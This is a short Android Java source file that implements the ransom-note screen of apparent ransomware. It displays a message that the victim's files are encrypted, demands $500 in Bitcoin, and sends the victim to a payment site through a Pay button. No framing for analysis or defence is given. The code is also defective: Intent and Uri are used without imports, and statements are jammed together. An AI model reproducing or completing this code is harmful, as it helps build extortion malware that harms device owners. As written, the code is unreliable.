RansomActivity.java:

import android.os.Bundle;import android.view.View;
import android.widget.Button;import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;
public class RansomActivity extends AppCompatActivity {
    private static final String TAG = "RansomActivity";
    @Override    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);        setContentView(R.layout.activity_ransom);
        // Get message TextView and set text
        TextView messageTextView = findViewById(R.id.messageTextView);        messageTextView.setText("Your files have been encrypted. Pay $500 in Bitcoin to get the decryption key.");
        // Get Pay button and set click listener
        Button payButton = findViewById(R.id.payButton);        payButton.setOnClickListener(new View.OnClickListener() {
            @Override            public void onClick(View v) {
                // Redirect user to a website where they can pay the ransom                Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse("https://www.bitcoin.com"));
                startActivity(intent);            }
        });    }
}